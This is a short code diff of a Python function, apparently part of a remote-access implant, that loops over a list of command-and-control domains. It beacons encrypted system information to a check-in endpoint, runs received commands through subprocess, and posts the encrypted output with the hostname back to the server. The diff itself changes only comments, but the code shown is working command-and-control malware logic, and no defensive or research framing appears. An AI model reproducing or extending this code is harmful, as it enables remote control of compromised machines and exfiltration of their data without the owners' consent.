@@ -48,11 +48,11 @@ def run_agent():
     while True:
         for url in C2_DOMAINS:
             try:
-                # 1. Prepare Heartbeat
+                # Prepare Heartbeat
                 raw_info = get_system_info()
                 encrypted_heartbeat = cipher.encrypt(raw_info.encode())
 
-                # 2. Beacon Out (Check-in)
+                # Check-in
                 response = requests.post(
                     f"{url}/checkin",
                     data=encrypted_heartbeat,
@@ -75,7 +75,7 @@ def run_agent():
                         else:
                             raw_result = subprocess.getoutput(command)
 
-                        # 3. Format Result
+                        # Format Result
                         formatted_result = f"{my_hostname}|{raw_result}"
                         encrypted_result = cipher.encrypt(formatted_result.encode())
 
@@ -92,7 +92,7 @@ def run_agent():
                     break
 
             except Exception as e:
-                # Fallback for empty results/errors so the dashboard doesn't hang
+                # Fallback for empty results/errors
                 error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                 try:
                     requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=CERT_PATH, timeout=5)
